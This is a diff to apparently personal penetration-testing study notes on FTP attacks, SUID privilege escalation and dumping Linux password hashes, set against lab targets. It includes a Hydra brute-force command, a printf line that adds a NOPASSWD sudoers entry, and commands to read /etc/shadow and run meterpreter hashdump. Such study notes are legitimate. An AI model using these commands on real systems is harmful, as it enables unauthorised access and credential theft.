@@ -299,6 +299,7 @@ DO MIMIKATZ FIRST!
 - FTP port 21, file sharing
 - Can be anonymous access
 - can be a brute force attack
+- Search for version vuln: `searchsploit versionOfFTP`
 1. After FTP found: try anonymous `ftp 10.10.x.x` 
 2. If not 1. : find namp scripts `ls -la /usr/share/nmap/scripts/ | grep ftp-* `
 3. Hydra bruteforce: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.x.x -t 4 ftp`
@@ -333,10 +334,19 @@ DO MIMIKATZ FIRST!
 3.  `ls -al /usr/local/share/copy.sh`
 4.  `printf '#!/bin/bash\necho "youraccount ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
 ### Exploiting SUID Binaries PRiv esc technique
-- depends on the owner of the SUID binary: needs root privileges
+- depends on the owner of the SUID binary: needs root privileges.
+- In order to elevate our privileges, we will need to identify an SUID binary that is owned by the "root" user.
 !!THIS DEMO IS ALREADY GOT IN TO THE SYSTEM, THIS IS PRIVESC PART!!
 "student demo"
 R=READ - W=WRITE - S=SUID - X=EXECUTE - 
 1. `groups youraccount`
 2. lists files detailly with hidden files: `ls -al`
 3. ...
+
+### Dumbping Linux Password Hashes
+-optaining bash session if backdoor exploit: `/bin/bash -i`
+- all encrypted passwords are stored in the: /etc/shadow , root priv
+-  password HASH: $1=MD5 $2=Blowfish $5=SHA-256 $6=SHA-512
+-  !!Gain privilege first and root user!!
+1. if root user: `cat /etc/shadow`
+2. background meterpreter session and `search hashdump`
